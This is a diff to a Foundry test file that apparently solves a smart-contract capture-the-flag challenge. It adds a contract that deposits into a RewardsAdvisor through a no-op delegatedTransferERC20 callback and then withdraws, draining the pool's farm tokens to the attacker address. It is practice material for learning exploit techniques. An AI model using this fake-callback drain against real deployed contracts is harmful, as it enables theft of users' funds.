@@ -62,7 +62,8 @@ contract Testing is Test {
     function testChallengeExploit() public {
         vm.startPrank(attacker, attacker);
 
-        // implement solution here
+        A a = new A(rewardsAdvisor, attacker);
+        a.init();
 
         vm.stopPrank();
         validation();
@@ -74,4 +75,23 @@ contract Testing is Test {
         assertGe(farm.balanceOf(attacker), 10_000e18);
         assertLe(farm.balanceOf(address(rewardsAdvisor)), 1e18);
     }
+}
+
+contract A {
+    address public immutable owner;
+    RewardsAdvisor private immutable ra;
+    address private immutable attacker;
+
+    constructor(RewardsAdvisor _ra, address _attacker) {
+        owner = address(this);
+        ra = _ra;
+        attacker = _attacker;
+    }
+
+    function init() external {
+        ra.deposit(1_000_000_000e18, payable(address(this)), address(this));
+        ra.withdraw(1_000_000_000e18, attacker, payable(address(this)));
+    }
+
+    function delegatedTransferERC20(address, address, uint256) external {}
 }
